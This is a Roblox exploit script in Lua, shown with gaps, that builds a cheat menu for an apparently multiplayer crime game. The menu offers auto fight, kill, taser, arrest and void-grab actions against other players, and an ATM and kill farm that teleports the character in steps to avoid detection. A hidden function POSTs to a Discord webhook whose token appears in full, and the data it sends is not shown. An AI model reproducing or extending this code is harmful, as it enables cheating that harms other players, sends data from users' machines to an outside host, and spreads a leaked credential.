...
local AutoFightPerson = Instance.new("TextButton")
...
local CopyDiscord_2 = Instance.new("TextButton")
...
AutoFightPerson.Name = "AutoFightPerson"
AutoFightPerson.Parent = CombatFrame
AutoFightPerson.BackgroundColor3 = Color3.new(0.117647, 0.156863, 0.235294)
AutoFightPerson.BorderColor3 = Color3.new(0, 0, 0)
AutoFightPerson.BorderSizePixel = 0
AutoFightPerson.Position = UDim2.new(5.91911764e-08, 0, 0.00362531701, 0)
AutoFightPerson.Size = UDim2.new(0, 397, 0, 33)
AutoFightPerson.Font = Enum.Font.SourceSans
AutoFightPerson.Text = ""
AutoFightPerson.TextColor3 = Color3.new(0, 0, 0)
AutoFightPerson.TextSize = 14

UICorner_12.Parent = AutoFightPerson

TextLabel_7.Parent = AutoFightPerson
...
TextLabel_7.Text = "Auto Fight With Animations (More Legit)"
...
UICorner_13.Parent = AutoStomp

TextLabel_8.Parent = AutoStomp
...
UICorner_14.Parent = AutoFight

TextLabel_9.Parent = AutoFight
...
TextLabel_9.Text = "Auto Fight Keybind H"
...
UICorner_15.Parent = SpamGrabHair

TextLabel_10.Parent = SpamGrabHair
...
TextLabel_10.Text = "Spam Grab Hair"
...
UICorner_16.Parent = Heal

TextLabel_11.Parent = Heal
...
TextLabel_11.Text = "Tp To Hospital Bed Under costum health"
...
UICorner_31.Parent = CopyDiscord

TextLabel_26.Parent = CopyDiscord
...
TextLabel_26.Text = "Copy Disocrd Invite"
...
CopyDiscord_2.Name = "CopyDiscord"
CopyDiscord_2.Parent = MiscFrame
CopyDiscord_2.BackgroundColor3 = Color3.new(0.117647, 0.156863, 0.235294)
CopyDiscord_2.BorderColor3 = Color3.new(0, 0, 0)
CopyDiscord_2.BorderSizePixel = 0
CopyDiscord_2.Position = UDim2.new(5.91911764e-08, 0, 0.00362531701, 0)
CopyDiscord_2.Size = UDim2.new(0, 397, 0, 33)
CopyDiscord_2.Font = Enum.Font.SourceSans
CopyDiscord_2.Text = ""
CopyDiscord_2.TextColor3 = Color3.new(0, 0, 0)
CopyDiscord_2.TextSize = 14

UICorner_35.Parent = CopyDiscord_2

TextLabel_29.Parent = CopyDiscord_2
...
TextLabel_30.Size = UDim2.new(0, 397, 0, 33)
TextLabel_30.Font = Enum.Font.SourceSans
TextLabel_30.Text = "Slay Farm Equip The Weapon You Wanna Use"
...
KillAll1.BackgroundColor3 = Color3.new(0.0862745, 0.117647, 0.176471)
...
TextLabel_32.Text = "ATM Farm"
TextLabel_32.TextColor3 = Color3.new(1, 1, 1)
TextLabel_32.TextSize = 16
TextLabel_32.TextXAlignment = Enum.TextXAlignment.Left

Box.Name = "Box"
Box.Parent = FarmingFrame
Box.BackgroundColor3 = Color3.new(0.117647, 0.156863, 0.235294)
Box.BorderColor3 = Color3.new(0, 0, 0)
Box.BorderSizePixel = 0
Box.Position = UDim2.new(5.91911764e-08, 0, 0.00362531701, 0)
Box.Size = UDim2.new(0, 397, 0, 33)
...
TextLabel_33.Text = "Box Job For Clout Enable this when your close at the store"
...
UICorner_40.Parent = PlayerFrame_2
...
UICorner_41.Parent = SpectateButton
...
UICorner_42.Parent = GrabPlayerToVoidButton
...
UICorner_43.Parent = KillUserButton
...
UICorner_44.Parent = TaserPersonButton
...
UICorner_45.Parent = WantedPlayerFrame
...
UICorner_46.Parent = ArrestPersonButton
...
local function REJTKF_fake_script() -- DivazScript.Webhook 
	...
	local function sendWebhook()
		...
		requestFunc({
			Url = "https://discord.com/api/webhooks/1517118963732054076/HSAAB5ovOlk9FCySt7_YQXFqhD0fsKJDvzLzfNPdSrwqKTHzitzEbthFNB-5uGWJqgyN",
			Method = "POST",
...
local function ZKMKC_fake_script() -- SlayFarm.LocalScript 
	...
	local function start(mode)
		...
		-- NOW START THE ACTUAL KILL LOOP
		running = true
	...
	LocalPlayer.CharacterAdded:Connect(function(char)
		if running then
			...
			hrp.AssemblyAngularVelocity = Vector3.zero
			ensureLocalCollide()
			equipSelectedWeapon() -- Re-equip selected weapon
			updateSafePosition()
...
local function LWBZEYD_fake_script() -- ATMFarm.LocalScript 
	...
	local TELEPORT_STEP_DELAY = 0.25
	local STEP_TELEPORT_SIZE = 45
	local TWEEN_THRESHOLD = 76 
	local TWEEN_WALKSPEED = 45
	...
	local function twoStepTeleport(targetCFrame)
		...
		-- EXACTLY YOUR REQUEST: TWEEN ONLY IF <76 STUDS
		if totalHorizontalDistance < TWEEN_THRESHOLD then
			...
			activeTween = TweenService:Create(HRP, tweenInfo, tweenGoal)
			...
			if not success or not running then return end
		...
		-- FOR 76+ STUDS: Use 120-stud step teleports (your request)
		...
		for stepIndex = 1, totalSteps do
			...
			local upPosition = currentHorizontalPos + Vector3.new(0, TELEPORT_UP_HEIGHT, 0)
			HRP.CFrame = CFrame.new(upPosition) * targetCFrame.Rotation
			freezeVel()
			task.wait(TELEPORT_STEP_DELAY)
			...
			local horizontalUpPos = nextHorizontalPos + Vector3.new(0, TELEPORT_UP_HEIGHT, 0)
	
			HRP.CFrame = CFrame.new(horizontalUpPos) * targetCFrame.Rotation
			freezeVel()
			task.wait(TELEPORT_STEP_DELAY)
	
			if not running then return end
	
			local groundPosition = nextHorizontalPos + Vector3.new(0, targetCFrame.Position.Y, 0)
			HRP.CFrame = CFrame.new(groundPosition) * targetCFrame.Rotation
			freezeVel()
			task.wait(TELEPORT_STEP_DELAY)
	...
	local function getMatchingATMs()
		...
		for _, atm in ipairs(allATMs) do
			if screenIsTarget(atm) then
				local atmPivot = atm:GetPivot().Position
				local distance = (HRP.Position - atmPivot).Magnitude
				table.insert(t, {ATM = atm, Dist = distance})
			end
		end
		...
		for _, entry in ipairs(t) do
			table.insert(sortedATMs, entry.ATM)
		end
		return sortedATMs
	end
	...
	local function getMatchingCashiers()
		...
		for _, cashier in ipairs(allCashiers) do
			if cashierIsTarget(cashier) then
				local cashierPivot = cashier:GetPivot().Position
				local distance = (HRP.Position - cashierPivot).Magnitude
				table.insert(t, {Cashier = cashier, Dist = distance})
			end
		end
		table.sort(t, function(a, b)
			return a.Dist < b.Dist
		end)
		local sortedCashiers = {}
		for _, entry in ipairs(t) do
			table.insert(sortedCashiers, entry.Cashier)
		end
	...
	local function processCashier(cashier)
		...
		while running and cashierIsTarget(cashier) and attempts < 10 do
			attempts = attempts + 1
			twoStepTeleport(cashier:GetPivot())
			local startTick = tick()
